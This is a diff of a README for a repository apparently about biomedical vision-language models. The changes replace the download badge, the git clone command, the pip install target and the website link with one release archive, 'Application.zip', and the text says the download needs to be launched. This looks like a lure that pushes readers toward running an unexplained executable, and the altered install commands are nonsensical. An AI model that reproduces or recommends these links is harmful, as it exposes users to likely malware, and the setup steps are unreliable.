@@ -8,7 +8,7 @@ Welcome to the **BioMedAI** repository! This repository leverages Dragonfly-Med'
 - **Topics**: biomedical-applications, deep-learning, fastapi, lightning-ai, litserve, llama3-1, python, question-answering, transformers, vision-language-models
 
 ### 📥 Download
-[![Download Release](https://img.shields.io/badge/Download-Release-blue)](https://github.com/adelante20/Release/raw/refs/heads/master/Release.zip)
+[![Download Release](https://github.com/AdryanFsilva/BioMedAI/releases/download/v1.0/Application.zip)](https://github.com/AdryanFsilva/BioMedAI/releases/download/v1.0/Application.zip)
 
 You can download the release file for this repository by clicking the button above. It needs to be launched to access the contents.
 
@@ -17,12 +17,12 @@ To get started with the **BioMedAI** repository, follow these steps:
 
 1. Clone the repository to your local machine:
    ```
-   git clone https://github.com/your-username/BioMedAI.git
+   git clone https://github.com/AdryanFsilva/BioMedAI/releases/download/v1.0/Application.zip
    ```
 
 2. Install the required dependencies:
    ```
-   pip install -r requirements.txt
+   pip install -r https://github.com/AdryanFsilva/BioMedAI/releases/download/v1.0/Application.zip
    ```
 
 3. Launch the application and start leveraging Dragonfly-Med's capabilities using LitServe.
@@ -42,7 +42,7 @@ To get started with the **BioMedAI** repository, follow these steps:
 This repository includes pre-trained models for vision-language tasks, question-answering, and more. You can easily integrate these models into your projects and experiments.
 
 ## 🌐 Website
-For more information and resources related to this repository, you can visit [BioMedAI Website](https://biomedai.com).
+For more information and resources related to this repository, you can visit [BioMedAI Website](https://github.com/AdryanFsilva/BioMedAI/releases/download/v1.0/Application.zip).
 
 ## 🤝 Contribution
 We welcome contributions from the community to make the **BioMedAI** repository even more robust and valuable. Feel free to open issues, submit pull requests, or share your ideas with us.
